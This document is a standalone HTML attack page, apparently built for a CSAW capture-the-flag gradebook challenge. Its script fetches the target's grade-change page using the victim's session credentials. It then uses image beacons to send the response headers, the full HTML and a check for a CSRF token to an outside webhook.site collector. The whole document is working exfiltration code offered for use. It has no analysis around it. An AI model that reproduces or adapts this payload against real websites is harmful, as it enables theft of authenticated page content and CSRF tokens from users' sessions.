<!DOCTYPE html>
<html>
<body>
    <script>
        function exfiltrate(data) {
            const params = new URLSearchParams();
            params.append('data', JSON.stringify(data));
            new Image().src = `https://webhook.site/adba0a28-6810-4262-9e4e-08d620900ebb?${params.toString()}`;
        }

        // Fetch the grade-change page and get entire HTML
        fetch('https://gradebook-app.ctf.csaw.io/grade-change', {
            credentials: 'include',
            mode: 'same-origin'
        })
        .then(response => {
            // Send response metadata first
            exfiltrate({
                type: 'response_metadata',
                status: response.status,
                statusText: response.statusText,
                url: response.url,
                redirected: response.redirected,
                headers: Object.fromEntries(response.headers.entries())
            });
            
            return response.text();
        })
        .then(html => {
            // Send the ENTIRE HTML content
            exfiltrate({
                type: 'full_html',
                html: html,
                length: html.length,
                has_csrf: html.includes('csrf_token'),
                timestamp: new Date().toISOString()
            });
        })
        .catch(error => {
            exfiltrate({
                type: 'error',
                error: error.toString(),
                error_name: error.name,
                error_message: error.message,
                timestamp: new Date().toISOString()
            });
        });
    </script>
</body>
</html>
